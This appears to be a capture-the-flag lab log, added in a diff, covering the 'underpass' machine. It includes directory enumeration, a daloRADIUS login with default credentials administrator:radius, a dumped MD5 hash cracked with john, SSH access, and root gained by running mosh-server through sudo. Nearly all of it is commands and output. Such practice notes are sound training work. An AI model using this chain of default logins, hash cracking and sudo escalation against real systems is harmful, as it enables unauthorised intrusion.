@@ -1,0 +1,180 @@
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ feroxbuster -u http://10.10.11.48 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,txt,html
+                                                                                                                    
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.11.48
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php, txt, html]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET       22l      105w     5952c http://10.10.11.48/icons/ubuntu-logo.png
+200      GET      363l      961w    10671c http://10.10.11.48/
+301      GET        9l       28w      315c http://10.10.11.48/daloradius => http://10.10.11.48/daloradius/
+200      GET       12l       11w      221c http://10.10.11.48/daloradius/.gitignore
+200      GET      412l     3898w    24703c http://10.10.11.48/daloradius/ChangeLog
+200      GET      340l     2968w    18011c http://10.10.11.48/daloradius/LICENSE
+200      GET      363l      961w    10671c http://10.10.11.48/index.html
+301      GET        9l       28w      319c http://10.10.11.48/daloradius/app => http://10.10.11.48/daloradius/app/
+301      GET        9l       28w      323c http://10.10.11.48/daloradius/contrib => http://10.10.11.48/daloradius/contrib/
+301      GET        9l       28w      319c http://10.10.11.48/daloradius/doc => http://10.10.11.48/daloradius/doc/
+301      GET        9l       28w      326c http://10.10.11.48/daloradius/app/common => http://10.10.11.48/daloradius/app/common/
+301      GET        9l       28w      323c http://10.10.11.48/daloradius/library => http://10.10.11.48/daloradius/library/
+301      GET        9l       28w      326c http://10.10.11.48/daloradius/contrib/db => http://10.10.11.48/daloradius/contrib/db/
+301      GET        9l       28w      321c http://10.10.11.48/daloradius/setup => http://10.10.11.48/daloradius/setup/
+301      GET        9l       28w      331c http://10.10.11.48/daloradius/contrib/scripts => http://10.10.11.48/daloradius/contrib/scripts/
+301      GET        9l       28w      325c http://10.10.11.48/daloradius/app/users => http://10.10.11.48/daloradius/app/users/
+301      GET        9l       28w      327c http://10.10.11.48/daloradius/doc/install => http://10.10.11.48/daloradius/doc/install/
+301      GET        9l       28w      334c http://10.10.11.48/daloradius/app/common/library => http://10.10.11.48/daloradius/app/common/library/
+301      GET        9l       28w      335c http://10.10.11.48/daloradius/app/common/includes => http://10.10.11.48/daloradius/app/common/includes/
+301      GET        9l       28w      333c http://10.10.11.48/daloradius/app/common/static => http://10.10.11.48/daloradius/app/common/static/
+301      GET        9l       28w      336c http://10.10.11.48/daloradius/app/common/templates => http://10.10.11.48/daloradius/app/common/templates/
+301      GET        9l       28w      343c http://10.10.11.48/daloradius/contrib/scripts/maintenance => http://10.10.11.48/daloradius/contrib/scripts/maintenance/
+302      GET        0l        0w        0c http://10.10.11.48/daloradius/app/users/index.php => home-main.php
+301      GET        9l       28w      330c http://10.10.11.48/daloradius/app/users/lang => http://10.10.11.48/daloradius/app/users/lang/
+301      GET        9l       28w      333c http://10.10.11.48/daloradius/app/users/library => http://10.10.11.48/daloradius/app/users/library/
+302      GET        0l        0w        0c http://10.10.11.48/daloradius/app/users/logout.php => login.php
+200      GET       19l      120w    10373c http://10.10.11.48/daloradius/app/users/static/images/daloradius_small.png
+302      GET        0l        0w        0c http://10.10.11.48/daloradius/app/users/static/js/ => ../../index.php
+200      GET        7l       21w     1707c http://10.10.11.48/daloradius/app/users/static/images/favicon/favicon-16x16.png
+200      GET       15l       70w     5742c http://10.10.11.48/daloradius/app/users/static/images/favicon/favicon-32x32.png
+200      GET        1l        1w      263c http://10.10.11.48/daloradius/app/users/static/images/favicon/site.webmanifest
+302      GET        0l        0w        0c http://10.10.11.48/daloradius/app/users/static/css/ => ../../index.php
+302      GET        0l        0w        0c http://10.10.11.48/daloradius/app/users/static/images/favicon/ => ../../../index.php
+302      GET        0l        0w        0c http://10.10.11.48/daloradius/app/users/static/images/ => ../../index.php
+302      GET        0l        0w        0c http://10.10.11.48/daloradius/app/users/static/ => ../index.php
+302      GET        0l        0w        0c http://10.10.11.48/daloradius/app/users/dologin.php => index.php
+200      GET      146l      911w    74623c http://10.10.11.48/daloradius/app/users/static/images/favicon/apple-touch-icon.png
+200      GET        7l     1222w    80420c http://10.10.11.48/daloradius/app/users/static/js/bootstrap.bundle.min.js
+200      GET        5l       21w    85875c http://10.10.11.48/daloradius/app/users/static/css/icons/bootstrap-icons.min.css
+200      GET        7l     2189w   194901c http://10.10.11.48/daloradius/app/users/static/css/bootstrap.min.css
+200      GET      112l      352w     4421c http://10.10.11.48/daloradius/app/users/login.php
+301      GET        9l       28w      333c http://10.10.11.48/daloradius/app/users/include => http://10.10.11.48/daloradius/app/users/include/
+301      GET        9l       28w      339c http://10.10.11.48/daloradius/app/users/notifications => http://10.10.11.48/daloradius/app/users/notifications/
+301      GET        9l       28w      332c http://10.10.11.48/daloradius/app/users/static => http://10.10.11.48/daloradius/app/users/static/
+[####################] - 87s   228184/228184  0s      found:44      errors:172    
+[####################] - 23s    18988/18988   820/s   http://10.10.11.48/ 
+[####################] - 31s    18988/18988   622/s   http://10.10.11.48/daloradius/ 
+[####################] - 31s    18988/18988   614/s   http://10.10.11.48/daloradius/app/ 
+[####################] - 39s    18988/18988   490/s   http://10.10.11.48/daloradius/contrib/ 
+[####################] - 49s    18988/18988   391/s   http://10.10.11.48/daloradius/doc/ 
+[####################] - 59s    18988/18988   323/s   http://10.10.11.48/daloradius/app/common/ 
+[####################] - 49s    18988/18988   387/s   http://10.10.11.48/daloradius/library/ 
+[####################] - 64s    18988/18988   296/s   http://10.10.11.48/daloradius/contrib/db/ 
+[####################] - 61s    18988/18988   309/s   http://10.10.11.48/daloradius/setup/ 
+[####################] - 56s    18988/18988   340/s   http://10.10.11.48/daloradius/app/users/ 
+[####################] - 52s    18988/18988   363/s   http://10.10.11.48/daloradius/doc/install/ 
+[####################] - 47s    18988/18988   402/s   http://10.10.11.48/daloradius/contrib/scripts/                                                                                                                                    
+┌──(kali㉿kali)-[~]
+
+
+
+
+default creds
+administrator:radius
+
+
+Management > List Users tab
+svcMosh:412DD4759978ACFCC81DEAB01B382403
+
+
+┌──(kali㉿kali)-[~]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
+Warning: no OpenMP support for this hash type, consider --fork=3
+Press 'q' or Ctrl-C to abort, almost any other key for status
+underwaterfriends (?)     
+1g 0:00:00:00 DONE (2025-08-15 13:38) 5.263g/s 15704Kp/s 15704Kc/s 15704KC/s undiamecaiQ..underthecola
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed. 
+                      
+
+┌──(kali㉿kali)-[~]
+└─$ ssh svcMosh@10.10.11.48    
+...
+svcMosh@underpass:~$ ls -la
+total 36
+drwxr-x--- 5 svcMosh svcMosh 4096 Jan 11  2025 .
+drwxr-xr-x 3 root    root    4096 Dec 11  2024 ..
+lrwxrwxrwx 1 root    root       9 Sep 22  2024 .bash_history -> /dev/null
+-rw-r--r-- 1 svcMosh svcMosh  220 Sep  7  2024 .bash_logout
+-rw-r--r-- 1 svcMosh svcMosh 3771 Sep  7  2024 .bashrc
+drwx------ 2 svcMosh svcMosh 4096 Dec 11  2024 .cache
+drwxrwxr-x 3 svcMosh svcMosh 4096 Jan 11  2025 .local
+-rw-r--r-- 1 svcMosh svcMosh  807 Sep  7  2024 .profile
+drwxr-xr-x 2 svcMosh svcMosh 4096 Dec 11  2024 .ssh
+-rw-r----- 1 root    svcMosh   33 Aug 14 16:49 user.txt
+svcMosh@underpass:~$ cat user.txt
+
+svcMosh@underpass:~$ sudo -l
+Matching Defaults entries for svcMosh on localhost:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User svcMosh may run the following commands on localhost:
+    (ALL) NOPASSWD: /usr/bin/mosh-server
+svcMosh@underpass:~$ sudo /usr/bin/mosh-server
+
+
+
+svcMosh@underpass:~$ sudo /usr/bin/mosh-server
+
+
+MOSH CONNECT 60001 YFN5L0Mkdl6lHbEKgGyuiA
+
+mosh-server (mosh 1.3.2) [build mosh 1.3.2]
+Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+
+[mosh-server detached, pid = 1951]
+svcMosh@underpass:~$ 
+
+
+┌──(kali㉿kali)-[~]
+└─$ MOSH_KEY=YFN5L0Mkdl6lHbEKgGyuiA mosh-client 10.10.11.48 60001
+
+...
+
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Thu Aug 14 05:40:06 PM UTC 2025
+
+  System load:  0.03              Processes:             226
+  Usage of /:   50.1% of 6.56GB   Users logged in:       0
+  Memory usage: 12%               IPv4 address for eth0: 10.10.11.48
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+
+root@underpass:~# 
